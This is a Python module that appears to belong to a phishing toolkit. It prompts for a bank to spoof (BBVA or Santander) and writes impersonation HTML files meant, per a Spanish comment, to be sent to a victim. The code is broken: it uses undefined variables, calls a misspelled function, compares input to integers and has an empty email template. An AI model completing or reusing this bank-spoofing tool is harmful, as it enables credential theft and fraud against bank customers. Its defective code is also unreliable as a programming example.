import time
import os
import sys
import smtplib

sys.path.append('../../')
from helper.helper import get_input_en, getPath

def bank_en():
    get_input_en()
    ##HTML que se enviara a la victima
    bank = input("Enter the bank you will spoof-->")
    if bank==1:
        bbva_en(userName,userEmail,url)
    elif bank==2:
        santander_en(userName,userEmail,url)
        
def bbva_en():
    #bbva bank attack
    bbvaHtml=(userName,userEmail,url)
    fileNameHtml=userName+"BBVAS.html"
    htmlFile=open("./reportFolder/"+fileNameHtml,"w")
    htmlFile.write(officeHtml)
    htmlFile.close()
    print("HTML creado y preparado para enviar")
    getPath()
    
def santader_en(userName,userEmail,url):
    #santander bank attack
    santanderHtml=("""
                   
                   """.format(currentDate,userEmail,userEmail,userEmail,userEmail,userEmail))
    fileNameHtml=userName+"Santanders.html"
    htmlFile=open("./reportFolder/"+fileNameHtml,"w")
    htmlFile.write(officeHtml)
    htmlFile.close()
    print("HTML creado y preparado para enviar")
    getPath()